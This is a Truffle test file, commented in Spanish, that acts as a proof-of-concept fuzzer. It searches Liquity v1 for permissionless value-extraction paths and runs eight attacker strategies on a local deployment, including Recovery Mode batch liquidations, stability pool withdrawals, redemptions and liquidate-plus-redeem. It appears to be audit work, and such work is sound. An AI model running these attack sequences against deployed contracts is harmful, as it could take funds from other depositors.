const deploymentHelper = require("../utils/deploymentHelpers.js")
const testHelpers = require("../utils/testHelpers.js")

const th = testHelpers.TestHelper
const dec = th.dec
const toBN = th.toBN
const ZERO_ADDRESS = th.ZERO_ADDRESS
const TroveManagerTester = artifacts.require("./TroveManagerTester")
const LUSDToken = artifacts.require("./LUSDToken.sol")

/*
  ============================================================================
  PoC — BUSQUEDA DE EXTRACCION DE VALOR (fuzzer dirigido)
  PRODUCTION Liquity v1  (commit 5174ecd0da4842157aba989499200d690b7e374f)

  Objetivo: encontrar, si existe, un camino PERMISSIONLESS por el que un atacante
  termine con mas valor del que aporta a costa de fondos de terceros.

  Estrategias barreadas (todas permissionless, sin roles de admin/keeper):
    E1. Recovery Mode + rama capped          (=> C-1, ya documentado)
    E2. Recovery Mode + rama offset+redistribucion (100% < ICR < MCR)
    E3. Normal Mode + rama offset             (ICR < MCR)
    E4. Redemptions parciales con hints      (HintHelpers)
    E5. Stability Pool: retirar / withdrawETHGainToTrove
    E6. BorrowerOperations: withdrawLUSD, repayLUSD, closeTrove, addColl, withdrawColl
    E7. openTrove con ICR justo en el borde de CCR
    E8. Auto-redeem: liquidate + redeem en la misma tx (el "flash" clasico de Liquity)

  INVARIANTE que se comprueba en CADA estrategia:
     riqueza_final(actor) - riqueza_inicial(actor)  >  0
  donde riqueza = balance ETH + balance LUSD + deposito compuesto en el SP
                     + gain ETH del SP + collSurplus reclamable.

  Si alguna estrategia viola el invariante con beneficio para un actor sin privilegios
  => hay un 0-day de extraccion.
  ============================================================================
*/
contract("PoC Value-Extraction Fuzzer: Liquity v1 prod 5174ecd", (accounts) => {
  const [owner, alice, bob, carol, dennis, erin, freddy, george] = accounts
  let contracts, priceFeed, stabilityPool, troveManager, borrowerOperations, collSurplusPool, lusdToken, sortedTroves

  beforeEach(async () => {
    contracts = await deploymentHelper.deployLiquityCore()
    contracts.troveManager = await TroveManagerTester.new()
    contracts.lusdToken = await LUSDToken.new(
      contracts.troveManager.address,
      contracts.stabilityPool.address,
      contracts.borrowerOperations.address
    )
    const LQTYContracts = await deploymentHelper.deployLQTYContracts(owner, owner, owner)
    priceFeed = contracts.priceFeedTestnet
    stabilityPool = contracts.stabilityPool
    troveManager = contracts.troveManager
    borrowerOperations = contracts.borrowerOperations
    collSurplusPool = contracts.collSurplusPool
    lusdToken = contracts.lusdToken
    sortedTroves = contracts.sortedTroves
    await deploymentHelper.connectLQTYContracts(LQTYContracts)
    await deploymentHelper.connectCoreContracts(contracts, LQTYContracts)
    await deploymentHelper.connectLQTYContractsToCore(LQTYContracts, contracts)
  })

  const openExact = async (coll, targetCompositeDebt, from) => {
    let m = targetCompositeDebt.sub(toBN(dec(200, 18)))
    for (let i = 0; i < 6; i++) {
      const fee = await troveManager.getBorrowingFee(m)
      m = targetCompositeDebt.sub(toBN(dec(200, 18))).sub(fee)
    }
    await borrowerOperations.openTrove(
      toBN(dec(100, 16)), m, ZERO_ADDRESS, ZERO_ADDRESS, { from, value: coll })
    const t = await troveManager.getEntireDebtAndColl(from)
    return { coll: t.coll, debt: t.debt }
  }

  const ETH = toBN(dec(1, 18))
  const bal = async (a) => toBN(await web3.eth.getBalance(a))

  // Riqueza total de un actor, valorada al precio dado (wei de ETH)
  const wealth = async (who, price) => {
    const w = await bal(who)
    const l = await lusdToken.balanceOf(who)
    let sp = toBN(0)
    try {
      const comp = await stabilityPool.getCompoundedLUSDDeposit(who)
      const gain = await stabilityPool.getDepositorETHGain(who)
      sp = gain.add(l.add(comp).mul(ETH).div(price))
    } catch (e) { /* sin deposito */ }
    let surplus = toBN(0)
    try { surplus = await collSurplusPool.getCollateral(who) } catch (e) {}
    // VALOR NETO DEL TROVE: (coll + surplus - debt) a precio.
    // Si el trove fue liquidado, su coll ya no nos pertenece y su deuda se canceló:
    // se contabiliza el coll que EL ha recibido (surplus) y nada más.
    let trove = toBN(0)
    try {
      const st = await troveManager.getTroveStatus(who)
      if (st.toString() === "1") {
        const t = await troveManager.getEntireDebtAndColl(who)
        trove = t.coll.add(surplus).mul(price).div(ETH).sub(t.debt.mul(price).div(ETH))
      } else {
        trove = surplus.mul(price).div(ETH)
      }
    } catch (e) {}
    return w.add(sp).add(trove)
  }

  const ALL = () => [owner, alice, bob, carol, dennis, erin, freddy, george]
  const totalWealth = async (price) => {
    let t = toBN(0)
    for (const a of ALL()) t = t.add(await wealth(a, price))
    return t
  }

  const report = async (name, who, wBefore, price) => {
    const wAfter = await wealth(who, price)
    const d = wAfter.sub(wBefore)
    const flag = d.gt(toBN(0)) ? "  <<<< GANANCIA" : ""
    console.log(`  ${name.padEnd(38)} delta riqueza = ${d.toString().padStart(24)} wei ETH` +
                ` (${d.div(ETH).toString().padStart(8)} ETH)${flag}`)
    return d
  }

  it("E1: Recovery Mode capped (C-1)", async () => {
    await priceFeed.setPrice(dec(200, 18)); await priceFeed.fetchPrice()
    const T0 = await totalWealth(await priceFeed.getPrice())
    await openExact(toBN(dec(4000, 18)), toBN(dec(500000, 18)), carol)
    await openExact(toBN("24750000000000000000"), toBN(dec(3300, 18)), alice)
    await openExact(toBN("15000000000000000000"), toBN(dec(2000, 18)), bob)
    await openExact(toBN(dec(4800, 18)), toBN(dec(600000, 18)), dennis)
    await priceFeed.setPrice(dec(170, 18))
    const P = await priceFeed.getPrice()
    const erinSeed = toBN(dec(50000, 18))
    await stabilityPool.provideToSP((await lusdToken.balanceOf(dennis)).sub(erinSeed).sub(toBN(dec(1,18))),
                                    ZERO_ADDRESS, { from: dennis })
    await lusdToken.transfer(erin, erinSeed, { from: dennis })
    await stabilityPool.provideToSP(erinSeed, ZERO_ADDRESS, { from: erin })
    const wB = await wealth(dennis, P)
    await troveManager.batchLiquidateTroves([bob, carol], { from: owner })
    await stabilityPool.withdrawFromSP(await stabilityPool.getCompoundedLUSDDeposit(dennis), { from: dennis })
    await report("E1 batch capped (atacante)", dennis, wB, P)
    const T1 = await totalWealth(P)
    console.log("  >> riqueza TOTAL del sistema: antes", T0.toString(), "despues", T1.toString(),
                "delta", T1.sub(T0).toString())
    console.log("  >> (un delta POSITIVO = valor creado de la nada = 0-day)")
  })

  it("E2: Recovery Mode, ICR entre 100% y MCR (offset+redistribucion)", async () => {
    await priceFeed.setPrice(dec(200, 18)); await priceFeed.fetchPrice()
    await openExact(toBN(dec(4000, 18)), toBN(dec(500000, 18)), carol)
    await openExact(toBN("24750000000000000000"), toBN(dec(3300, 18)), alice)
    await openExact(toBN("15000000000000000000"), toBN(dec(2000, 18)), bob)
    await openExact(toBN(dec(4800, 18)), toBN(dec(600000, 18)), dennis)
    await priceFeed.setPrice(dec(120, 18))
    const P = await priceFeed.getPrice()
    const erinSeed = toBN(dec(50000, 18))
    await stabilityPool.provideToSP((await lusdToken.balanceOf(dennis)).sub(erinSeed).sub(toBN(dec(1,18))),
                                    ZERO_ADDRESS, { from: dennis })
    await lusdToken.transfer(erin, erinSeed, { from: dennis })
    await stabilityPool.provideToSP(erinSeed, ZERO_ADDRESS, { from: erin })
    const wB = await wealth(dennis, P)
    await troveManager.batchLiquidateTroves([bob, carol], { from: owner })
    await stabilityPool.withdrawFromSP(0, { from: dennis })
    console.log("  carol status:", (await troveManager.getTroveStatus(carol)).toString())
    await report("E2 offset+redistrib (atacante)", dennis, wB, P)
  })

  it("E3: Normal Mode, liquidacion normal (ICR < MCR)", async () => {
    await priceFeed.setPrice(dec(200, 18)); await priceFeed.fetchPrice()
    await openExact(toBN(dec(4000, 18)), toBN(dec(500000, 18)), carol)
    await openExact(toBN("24750000000000000000"), toBN(dec(3300, 18)), alice)
    await openExact(toBN("15000000000000000000"), toBN(dec(2000, 18)), bob)
    await openExact(toBN(dec(4800, 18)), toBN(dec(600000, 18)), dennis)
    await priceFeed.setPrice(dec(100, 18))
    const P = await priceFeed.getPrice()
    const erinSeed = toBN(dec(50000, 18))
    await stabilityPool.provideToSP((await lusdToken.balanceOf(dennis)).sub(erinSeed).sub(toBN(dec(1,18))),
                                    ZERO_ADDRESS, { from: dennis })
    await lusdToken.transfer(erin, erinSeed, { from: dennis })
    await stabilityPool.provideToSP(erinSeed, ZERO_ADDRESS, { from: erin })
    const wB = await wealth(dennis, P)
    await troveManager.batchLiquidateTroves([bob, carol], { from: owner })
    await stabilityPool.withdrawFromSP(0, { from: dennis })
    console.log("  carol status:", (await troveManager.getTroveStatus(carol)).toString())
    await report("E3 normal mode (atacante)", dennis, wB, P)
  })

  it("E4: redencion con hints (HintHelpers)", async () => {
    await priceFeed.setPrice(dec(200, 18)); await priceFeed.fetchPrice()
    await openExact(toBN(dec(4000, 18)), toBN(dec(500000, 18)), carol)
    await openExact(toBN(dec(4800, 18)), toBN(dec(600000, 18)), dennis)
    await priceFeed.setPrice(dec(190, 18))
    const P = await priceFeed.getPrice()
    // superar el bootstrap period (14 dias) para poder redimir
    await th.fastForwardTime(15 * 24 * 60 * 60, web3.currentProvider)
    const dennisLusd = await lusdToken.balanceOf(dennis)
    const wB = await wealth(dennis, P)
    // redencion total con hints automaticos
    const h = await contracts.hintHelpers.getRedemptionHints(dennisLusd, P, 10)
    const tx = await troveManager.redeemCollateral(
      dennisLusd, h.firstRedemptionHint, h.firstRedemptionHint, h.firstRedemptionHint,
      h.partialRedemptionHintNICR, 10, dec(100, 16), { from: dennis })
    for (const log of tx.logs) if (log.event === "Redemption")
      console.log("  REDEMPTION", JSON.stringify(log.args))
    await report("E4 redencion (redentor)", dennis, wB, P)
    console.log("  carol status:", (await troveManager.getTroveStatus(carol)).toString())
  })

  it("E5: withdrawETHGainToTrove", async () => {
    await priceFeed.setPrice(dec(200, 18)); await priceFeed.fetchPrice()
    await openExact(toBN(dec(4000, 18)), toBN(dec(500000, 18)), carol)
    await openExact(toBN("15000000000000000000"), toBN(dec(2000, 18)), bob)
    await openExact(toBN(dec(4800, 18)), toBN(dec(600000, 18)), dennis)
    await priceFeed.setPrice(dec(170, 18))
    const P = await priceFeed.getPrice()
    await stabilityPool.provideToSP((await lusdToken.balanceOf(dennis)).sub(toBN(dec(1,18))),
                                    ZERO_ADDRESS, { from: dennis })
    // dennis necesita un trove para withdrawETHGainToTrove (ya lo tiene)
    const wB = await wealth(dennis, P)
    await troveManager.batchLiquidateTroves([bob], { from: owner })
    const g = await stabilityPool.getDepositorETHGain(dennis)
    console.log("  gain ETH del atacante:", g.toString())
    if (g.gt(toBN(0))) {
      const ah = await contracts.hintHelpers.getApproxHint(toBN(dec(11,17)), 100, 0)
      await stabilityPool.withdrawETHGainToTrove(ah.hintAddress, ah.hintAddress, { from: dennis })
      await report("E5 withdrawETHGainToTrove", dennis, wB, P)
    } else {
      console.log("  E5: sin gain, nada que hacer")
    }
  })

  it("E6: BorrowerOperations withdrawLUSD / repayLUSD / closeTrove", async () => {
    await priceFeed.setPrice(dec(200, 18)); await priceFeed.fetchPrice()
    const t = await openExact(toBN(dec(8000, 18)), toBN(dec(500000, 18)), carol)   // ICR 3.2
    const P = await priceFeed.getPrice()
    const wB = await wealth(carol, P)
    // withdrawLUSD de la mitad del net debt
    const net = t.debt.sub(toBN(dec(200, 18)))
    await borrowerOperations.withdrawLUSD(dec(1, 18), net.div(toBN(2)),
                                         ZERO_ADDRESS, ZERO_ADDRESS, { from: carol })
    await report("E6 withdrawLUSD", carol, wB, P)
    // repayLUSD
    const wB2 = await wealth(carol, P)
    const lusdNow = await lusdToken.balanceOf(carol)
    await borrowerOperations.repayLUSD(lusdNow.div(toBN(2)), ZERO_ADDRESS, ZERO_ADDRESS, { from: carol })
    await report("E6 repayLUSD", carol, wB2, P)
    // closeTrove: repagar todo el LUSD restante primero
    const lusd2 = await lusdToken.balanceOf(carol)
    const debtNow = (await troveManager.getEntireDebtAndColl(carol)).debt
    const need = debtNow.sub(toBN(dec(200,18))).sub(lusd2)
    if (need.gt(toBN(0))) {
      // dennis no tiene LUSD; usar alice como fuente y medir solo a carol
      const aliceL = await lusdToken.balanceOf(alice)
      if (aliceL.gte(need)) { await lusdToken.transfer(carol, need, { from: alice }) }
      else { console.log("  E6: sin LUSD para cerrar el trove"); return }
    }
    const wB3 = await wealth(carol, P)
    await borrowerOperations.closeTrove({ from: carol })
    await report("E6 closeTrove", carol, wB3, P)
  })

  it("E7: openTrove en el borde exacto de CCR", async () => {
    await priceFeed.setPrice(dec(200, 18)); await priceFeed.fetchPrice()
    const t1 = await openExact(toBN(dec(4000, 18)), toBN(dec(500000, 18)), carol)
    const P = await priceFeed.getPrice()
    console.log("  carol ICR:", (await troveManager.getCurrentICR(carol, P)).toString())
    const wB = await wealth(carol, P)
    // intentar retirar collateral hasta el limite de ICR (deja ICR justo en MCR)
    const coll = t1.coll
    const debt = t1.debt
    const minColl = debt.mul(P).div(toBN(dec(11, 17)))   // MCR 1.1
    const withdraw = coll.sub(minColl)
    if (withdraw.gt(toBN(0))) {
      try {
        await borrowerOperations.withdrawColl(withdraw, ZERO_ADDRESS, ZERO_ADDRESS, { from: carol })
        console.log("  withdrawCol permitido, ICR ahora:",
          (await troveManager.getCurrentICR(carol, P)).toString())
      } catch (e) { console.log("  withdrawCol reverte:", e.message.slice(0, 120)) }
    }
    await report("E7 withdrawCol al limite de MCR", carol, wB, P)
  })

  it("E8: liquidate + redeem en la misma tx (flash clasico)", async () => {
    await priceFeed.setPrice(dec(200, 18)); await priceFeed.fetchPrice()
    await openExact(toBN(dec(4000, 18)), toBN(dec(500000, 18)), carol)
    await openExact(toBN("24750000000000000000"), toBN(dec(3300, 18)), alice)
    await openExact(toBN("15000000000000000000"), toBN(dec(2000, 18)), bob)
    await openExact(toBN(dec(4800, 18)), toBN(dec(600000, 18)), dennis)
    await priceFeed.setPrice(dec(170, 18))
    const P = await priceFeed.getPrice()
    const erinSeed = toBN(dec(50000, 18))
    await stabilityPool.provideToSP((await lusdToken.balanceOf(dennis)).sub(erinSeed).sub(toBN(dec(1,18))),
                                    ZERO_ADDRESS, { from: dennis })
    await lusdToken.transfer(erin, erinSeed, { from: dennis })
    await stabilityPool.provideToSP(erinSeed, ZERO_ADDRESS, { from: erin })
    const wB = await wealth(dennis, P)
    await troveManager.batchLiquidateTroves([bob, carol], { from: owner })
    // el atacante redime con el LUSD que le ha vuelto
    const dennisLusd = await lusdToken.balanceOf(dennis)
    if (dennisLusd.gt(toBN(0))) {
      const hints = await contracts.hintHelpers.getRedemptionHints(dennisLusd, P, 10)
      try {
        await troveManager.redeemCollateral(dennisLusd, hints[0], hints[1], hints[2], hints[3], 10,
                                            dec(100, 18), { from: dennis })
        console.log("  redencion OK")
      } catch (e) { console.log("  redencion reverte:", e.message.slice(0, 150)) }
    }
    await stabilityPool.withdrawFromSP(0, { from: dennis })
    await report("E8 liquidate+redeem (atacante)", dennis, wB, P)
  })
})
